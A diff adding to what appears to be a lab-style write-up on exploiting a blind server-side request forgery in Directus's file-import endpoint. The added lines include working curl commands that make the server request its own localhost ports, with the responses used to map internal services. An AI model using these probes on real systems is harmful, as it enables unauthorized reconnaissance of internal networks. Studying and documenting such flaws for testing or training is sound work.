@@ -252,4 +252,31 @@ Because URL fetching (`axios.get`) happens **prior to any authentication or auth
 ### Exploiting Blind SSRF in Directus
 Since we cannot access the results of the SSRF, how can we use it to further our attack? As we have already demonstrated, the application returns different messages for valid files and non-existing files. We can use these different messages to infer if a resource exists.
 
-As a reminder, we receive an HTTP `403 Forbidden` when we request a valid resource and an HTTP `500 Internal Server Error` with "Request failed with status code 404" when we request a resource that doesn't exist.
+As a reminder, we receive an HTTP `403 Forbidden` when we request a valid resource and an HTTP `500 Internal Server Error` with "Request failed with status code `404`" when we request a resource that doesn't exist.
+
+We tested whether the SSRF vulnerability could be used to make Directus connect to itself by targeting localhost.
+```bash
+curl -i -X POST -H "Content-Type: application/json" \
+  -d '{"url":"http://localhost:8000/"}' \
+  http://apigateway:8000/files/import
+
+```
+Server response:
+```bash
+"connect ECONNREFUSED 127.0.0.1:8000"
+```
+This confirms Directus is not listening on port `8000` (likely API Gateway is). `"localhost"` refers to the Directus server, not the Kong API Gateway.
+
+`localhost`:`8055` (Directus default port):
+```bash
+curl -i -X POST -H "Content-Type: application/json" \
+  -d '{"url":"http://localhost:8055/"}' \
+  http://apigateway:8000/files/import
+
+```
+Server response:
+```bash
+"You don't have permission to access this."
+
+```
+This confirms that SSRF request reached Directus on port `8055` as it returned HTTP `403 Forbidden`, but confirms a valid internal resource was accessed.
